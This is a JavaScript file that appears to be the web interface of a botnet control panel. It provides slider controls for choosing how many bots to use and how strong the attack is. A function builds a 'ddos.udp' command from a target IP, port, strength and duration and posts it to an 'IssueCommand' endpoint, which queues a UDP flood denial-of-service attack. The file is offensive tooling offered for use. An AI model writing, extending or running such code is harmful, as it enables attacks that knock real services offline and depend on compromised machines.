var udpfloodbotsmouseState=0;
var udpfloodstrengthmouseState=0;

function udpfloodstrength_Slider(event){
	var x;if (event.layerX) {x = event.layerX - 2;} else {x = event.x - 2;}if(Math.round((x / 96) * 100) > 100 || Math.round((x / 96) * 100) < 1) {return;}
	$("#UDPFlood_Strength_InnerSlider").css("width", x + "px");
	$("#UDPFlood_Strength").val((Math.round(((x / 96) * 100))) + "%");
}
function udpfloodstrength_SliderBegin(event){udpfloodstrengthmouseState=1;}
function udpfloodstrength_SliderMove(event) {if (udpfloodstrengthmouseState == 1) {udpfloodstrength_Slider(event);}}
function udpfloodstrength_SliderEnd(event) {udpfloodstrengthmouseState=0;}

function udpfloodbots_Slider(event){
	var x;if (event.layerX) {x = event.layerX - 2;} else {x = event.x - 2;}if(Math.round((x / 96) * 100) > 100 || Math.round((x / 96) * 100) < 1) {return;}
	$("#UDPFlood_Bots_InnerSlider").css("width", x + "px");
	$("#UDPFlood_Bots").val(Math.round(((x / 96) * totalbots)));
}
function udpfloodbots_SliderBegin(event){udpfloodbotsmouseState=1;}
function udpfloodbots_SliderMove(event) {if (udpfloodbotsmouseState == 1) {udpfloodbots_Slider(event);}}
function udpfloodbots_SliderEnd(event) {udpfloodbotsmouseState=0;}

function processUDPFlood(obj) {
	var poststring = '';
	var commandstring = 'ddos.udp ';
	commandstring += escape($("#UDPFlood_TargetIP").val() + ":" + $("#UDPFlood_TargetPort").val());
	commandstring += " " + Math.round(1000 - ((parseInt($("#UDPFlood_Strength").val().replace("%", ""), 10) / 100) * 1000)) + " " + $("#UDPFlood_Duration").val();
	poststring="&submit=1&command=" + escape(commandstring) + "&commandquota=" + $("#UDPFlood_Bots").val();
	$("#desktop-window-udpflood-content").html("Loading...");
	$.ajax({
		async: true,
		url: "index.php?p=IssueCommand",
		type: "POST",
		data: poststring,
		success: function(data){
			$("#desktop-window-udpflood-content").html("Successfully added command to Task Queue.<br /><br />" +
			"<a href=\"javascript:void(0)\" onclick=\"UDPFlood_Reload()\">Click here</a> to add another ddos attack.");
		}
	});
	return false;
}

function UDPFlood_Reload() {
	
	showWindow('udpflood');
}
